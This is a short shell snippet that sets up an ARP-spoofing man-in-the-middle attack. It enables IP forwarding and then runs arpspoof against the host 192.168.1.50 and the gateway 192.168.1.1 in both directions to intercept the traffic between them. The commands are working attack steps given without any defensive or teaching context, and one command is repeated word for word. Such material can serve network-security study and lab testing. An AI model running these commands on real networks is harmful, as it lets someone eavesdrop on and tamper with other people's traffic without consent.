# Enable ip forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Perform an ARP spoof on 192.168.1.50 and redirect traffic to 192.168.1.1
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Intercept all traffic between 192.168.1.50 and 192.168.1.1
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
